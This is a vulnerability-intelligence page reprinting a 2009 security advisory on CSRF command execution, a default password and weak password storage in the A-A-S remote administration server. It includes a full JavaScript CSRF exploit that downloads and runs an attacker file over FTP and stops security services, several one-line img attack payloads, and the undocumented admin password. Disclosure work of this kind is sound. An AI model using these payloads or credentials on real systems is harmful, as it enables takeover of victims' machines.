How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

## Syhunt: A-A-S (Application Access Server) Multiple Security Vulnerabilities

**Advisory-ID**: 200905111
**Discovery Date**: 3.23.2009
**Release Date**: 5.11.2009
**Affected Applications**: A-A-S 2.0.48 and possibly older versions
**Class**: XSRF (Cross Site Request Forgery) Arbitrary Command
Execution, Undocumented Default Password, Insecure Password
Storage
**Status**: Vendor informed. No fix available
**Vendor**: Klinzmann
**Vendor URL**: <http://www.klinzmann.name/a-a-s/index_en.html>
**Advisory URL**: <http://www.syhunt.com/advisories/?id=aas-multiple>

The Common Vulnerabilities and Exposures (CVE) project has
assigned the following CVEs to these vulnerabilities:

* CVE-2009-1464 - index.aas job parameter XSRF Arbitrary Command

Execution Vulnerability

* CVE-2009-1465 - Default Admin Password Vulnerability
* CVE-2009-1466 - Insecure Password and Port Keyword Storage

Vulnerability

---

**Overview**:
The Application Access Server is a popular freeware remote
administration tool that allows to start and stop applications
or services over the Internet using a Web-based client. It also
allows to uninstall applications, remotely shutdown and
retrieve various information about the current system the server
is running on. It claims to be able to "black list" aggressors
and run in "Stealth mode", thus evading port scanners.

The A-A-S server also supports DynDNS.org, which allows aliasing
the server IP to a static hostname.

**Description**:
The Application Access Server is vulnerable to extremely
dangerous XSRF (Cross Site Request Forgery) attacks. A remote
attacker can use the XSRF flaw to take control over the system
running the A-A-S server. The issue is triggered when a web page
containing a malicious JavaScript code is viewed. Such malicious
code can automatically make requests to the AAS server on the
user's behalf.

Two additional vulnerabilities affect the Application Access
Server: an undocumented default password and insecure password
storage. Technical details are included below.

---

**Details**:
1) index.aas job parameter XSRF (Cross Site Request Forgery)
Arbitrary Command Execution

Example 1 - Arbitrary Command Execution / File Upload
See: <http://www.syhunt.com/advisories/aashack.txt>

```

// Javascript is used to force the browser to sequentially load
// the images that will trigger the server commands.

var dd=1000; // default delay time (ms)
var aas_url='http://[host]:6262'; // target AAS host
var ftp_host='x.x.x.x'; // attacker ftp host
var ftp_user='anonymous';
var ftp_pass='123456';
var ftp_commands_file='aashack.ftp';
var batch_file='aashack.bat';
var attacker_file='file.exe'; // file to upload

function delay(ms) {
var date = new Date();
var curDate = null;
do { curDate = new Date(); }
while(curDate-date < ms);
}

function writeimg(job,action,select) {
var act = escape(action);
var sel = escape(select);
document.write('<img src="'+aas_url+'/index.aas?job='+job+
'&action='+act+'&select='+sel+'" style="visibility:hidden;">');
}

// Main Functions
function Run(action,dms) {
writeimg('command',action,''); delay(dms);
}
function Console(cmdline,dms) {
Run('cmd /C '+cmdline,dms);
}
function AddFTPCmd(cmdline) {
Console('echo '+cmdline+'>>'+ftp_commands_file,dd);
}
function AddBatchLine(line) {
Console('echo '+line+'>>'+batch_file,dd);
}
//function Kill(exename) {
Run('taskkill /f /im '+exename,dd); // alternative way to kill a process
}
function StopSvc(servicename) {
writeimg('setservice','stop',servicename); delay(dd);
}
function KillProcess(exename) {
writeimg('killprocess','',exename); delay(dd);
}

function StopUndesiredServices() {
//StopSvc("somefirewall");
//StopSvc("someantivirus");
//StopSvc("wuauserv"); // Automatic Updates
}

function KillUndesiredProcesses() {
//KillProcess('firewall.exe');
}

AddFTPCmd(ftp_user);
AddFTPCmd(ftp_pass);
AddFTPCmd('binary');
AddFTPCmd('get '+attacker_file);
AddFTPCmd('close');
AddFTPCmd('bye');
AddBatchLine('@echo off');
AddBatchLine('ftp -is:'+ftp_commands_file+' '+ftp_host);
AddBatchLine('start '+attacker_file);
AddBatchLine('del '+ftp_commands_file);
AddBatchLine('del %0'); // self-destruct
StopUndesiredServices();
KillUndesiredProcesses();
Run(batch_file,dd);

```

This exploit demonstration code automatically makes sequential
requests to the AAS server on the user's behalf (if the user is
logged in to the server), disabling undesired services,
uploading and launching a file on the target machine.
It has been successfully tested on IE 7.0 and Firefox 3.08.
Should work on any browser that has javascript enabled

Please note that the server's security features like host access
list and port modes (Silent or Stealth) will not protect against
the XSRF flaw if enabled.

Example 2 - Arbitrary Command Execution:

```

<img src="http://[AAS IP or DYNDNS HOST]:6262/index.aas?job=command&action=[command]">

```

This for example would launch the Calculator:
/index.aas?job=command&action=calc.exe

Example 3 - Stopping Services:

```

<img src="http://[AAS IP or DYNDNS HOST]:6262/index.aas?job=setservice&action=stop&select=[servicename]">

```

This for example would disable Automatic Updates:
/index.aas?job=setservice&action=stop&select=wuauserv

Example 4 - Killing Processes:

```

<img src="http://[AAS IP or DYNDNS HOST]:6262/index.aas?job=killprocess&select=[exename]">

```

Example:
/index.aas?job=killprocess&select=notepad.exe

Additional commands are available via the job parameter.

2) Default Admin Password Vulnerability
By default, A-A-S installs with a default admin account. The
account has an undocumented default password of "wildbat" and
all the security rights enabled. These default rights allow to
execute any commands on the machine.

3) Insecure Password and Port Keyword Storage Vulnerability
A-A-S passwords and the port keyword (used to connect to the
server when in Stealth or Silent mode) are stored as a base64
string in the "aas.ini" file, contained in the A-A-S install
directory, with no encryption at all. This allows the password
or port keyword to be easily retrieved.

---

**Vulnerability Status**:
The vendor was contacted, immediately responded and will be
releasing a fix soon.

As a workaround to the XSRF vulnerability, the vendor recommends
limiting the security rights in the user settings screen for
each user:
- Disable the "Allow own command" option (command execution will
not be possible after this option is disabled).
- If possible also disable the "Enable kill process",
"Start/Stop service" and "Run application" rights.

Avoid completely navigating to other websites while logged in to
the Application Access Server.

Never start the server using its default settings (as explained
above machines running a default A-A-S may be easily
compromised). Change the password of the admin account first.
